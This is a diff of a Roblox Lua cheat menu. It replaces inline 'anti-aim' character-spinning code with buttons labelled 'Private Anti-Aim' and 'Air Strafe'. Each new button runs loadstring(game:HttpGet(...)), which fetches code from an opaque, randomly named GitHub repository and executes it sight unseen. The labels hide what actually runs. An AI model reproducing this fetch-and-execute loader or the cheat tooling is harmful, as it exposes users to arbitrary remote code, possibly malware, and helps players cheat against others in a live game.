@@ -51,50 +51,16 @@ local Window = Rayfield:CreateWindow({
  local PremiumSection = PremiumTab:CreateSection("Private Anti-Aim (Enable all scripts)")
 
  local Button = PremiumTab:CreateButton({
-    Name = "Private Anti-Aim Function 1",
+    Name = "Private Anti-Aim",
     Callback = function()
-        local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
-while true do
-	task.wait(0.1) 
-	
-	local randomAngle = math.rad(0, 360) 
-	
-	player.Character:SetPrimaryPartCFrame(CFrame.new(player.Character.PrimaryPart.Position) * CFrame.Angles(0, math.rad(randomAngle), 0))
-end
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/skid7543w7hdghedty/vcxzxcfgh/refs/heads/main/gjkftuytrutyu"))()
     end,
  })
 
  local Button = PremiumTab:CreateButton({
-    Name = "Private Anti-Aim Function 2",
+    Name = "Air Strafe",
     Callback = function()
-        local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
-while true do
-	task.wait(0.1) 
-	
-	local randomAngle = math.random(0, 360) 
-	
-	player.Character:SetPrimaryPartCFrame(CFrame.new(player.Character.PrimaryPart.Position) * CFrame.Angles(0, math.rad(randomAngle), 0))
-end
-    end,
- })
-
- local Button = PremiumTab:CreateButton({
-    Name = "Private Anti-Aim Function 3",
-    Callback = function()
-        local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
-while true do
-	task.wait(0.1) 
-	
-	local randomAngle = math.random(0, 180) 
-	
-	player.Character:SetPrimaryPartCFrame(CFrame.new(player.Character.PrimaryPart.Position) * CFrame.Angles(0, math.rad(randomAngle), 0))
-end
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/skid7543w7hdghedty/lljhgfkjfdjdsfg/refs/heads/main/uuyetofdsjsjdkf"))()
     end,
  })
 
